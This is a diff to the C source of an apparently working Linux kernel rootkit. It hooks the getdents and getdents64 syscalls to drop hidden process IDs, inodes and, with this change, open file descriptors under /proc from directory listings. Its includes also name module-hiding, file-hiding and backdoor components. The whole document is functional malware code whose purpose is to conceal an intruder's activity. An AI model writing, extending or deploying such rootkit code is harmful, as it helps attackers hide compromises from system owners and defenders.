@@ -17,8 +17,8 @@
 #include "modhide.h"
 #include "filehide.h"
 #include "backdoor.h"
-#include "hidepid.h"
-#include "hideopen.h"
+#include "pidhide.h"
+#include "openhide.h"
 #include "read.h"
 
 extern rootkit_t rootkit;
@@ -139,6 +139,10 @@ g7_getdents(const struct pt_regs *pt_regs)
     dirent_t_ptr dirent = (dirent_t_ptr)pt_regs->si;
     long ret = sys_getdents(pt_regs);
 
+    bool is_fd = 0; // We only need /proc/[pid]/fd dirs
+    struct file *dirfile = fget(fd);
+    pid_t fd_pid;
+
     if (ret <= 0 || !(kdirent = (dirent_t_ptr)kzalloc(ret, GFP_KERNEL)))
         return ret;
 
@@ -165,11 +169,17 @@ g7_getdents(const struct pt_regs *pt_regs)
         }
     }
 
+    if(rootkit.hiding_open && (fd_pid = may_fd(dirfile))) {
+        is_fd = 1;
+        fill_fds(fd_pid);
+    }
+
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);
 
         if ((may_proc && list_contains_pid(&hidden_pids, PID_FROM_NAME(cur_kdirent->d_name)))
-            || list_contains_inode(hi_head, cur_kdirent->d_ino))
+            || list_contains_inode(hi_head, cur_kdirent->d_ino)
+            || list_contains_fd(&hidden_fds, FD_FROM_NAME(cur_kdirent->d_name)))
         {
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
@@ -188,6 +198,7 @@ g7_getdents(const struct pt_regs *pt_regs)
     atomic_dec(&getdents_count);
 
 yield:
+    clear_hidden_fds();
     kfree(kdirent);
     return ret;
 }
@@ -200,7 +211,6 @@ g7_getdents64(const struct pt_regs *pt_regs)
     typedef struct linux_dirent64 *dirent64_t_ptr;
 
     bool may_proc;
-
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
@@ -210,7 +220,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
     long ret = sys_getdents64(pt_regs);
 
-    bool is_fd = 0; //We only need /proc/[pid]/fd dirs
+    bool is_fd = 0; // We only need /proc/[pid]/fd dirs
     struct file *dirfile = fget(fd);
     pid_t fd_pid;
 
@@ -239,8 +249,8 @@ g7_getdents64(const struct pt_regs *pt_regs)
                 hi_tail = add_inode_to_list(hi_tail, inode);
         }
     }
-    
-    if(rootkit.hiding_open_files && (fd_pid = may_fd(dirfile))) {
+
+    if(rootkit.hiding_open && (fd_pid = may_fd(dirfile))) {
         is_fd = 1;
         fill_fds(fd_pid);
     }
